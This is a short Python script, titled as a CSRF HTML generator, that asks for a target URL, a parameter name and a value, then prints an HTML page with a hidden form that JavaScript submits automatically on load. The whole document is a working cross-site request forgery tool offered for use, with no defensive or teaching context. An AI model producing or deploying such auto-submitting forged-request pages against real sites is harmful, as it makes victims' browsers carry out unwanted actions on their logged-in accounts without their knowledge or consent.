# Simple CSRF HTML Generator

target_url = input("Enter target URL: ")
parameter = input("Enter parameter name: ")
value = input("Enter parameter value: ")

payload = f"""
<html>
  <body>
    <form action="{target_url}" method="POST">
      <input type="hidden" name="{parameter}" value="{value}">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
"""

print("\nGenerated CSRF Payload:\n")
print(payload)